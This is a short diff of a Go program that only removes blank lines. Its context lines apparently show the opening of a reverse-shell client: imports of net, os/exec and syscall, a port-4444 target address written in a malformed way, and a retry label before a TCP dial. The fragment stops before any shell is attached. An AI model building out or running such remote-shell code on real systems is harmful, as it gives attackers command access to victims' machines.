@@ -1,5 +1,4 @@
 package main
-
 import(
 	"fmt"
 	"net"
@@ -7,11 +6,9 @@ import(
 	"os/exec"
 	"syscall"
 )
-
 var(
 	ip_port = "127.0.0.:4444"
 )
-
 func main(){
 	cnn:
 	co, error := net.Dial("tcp",ip_port)
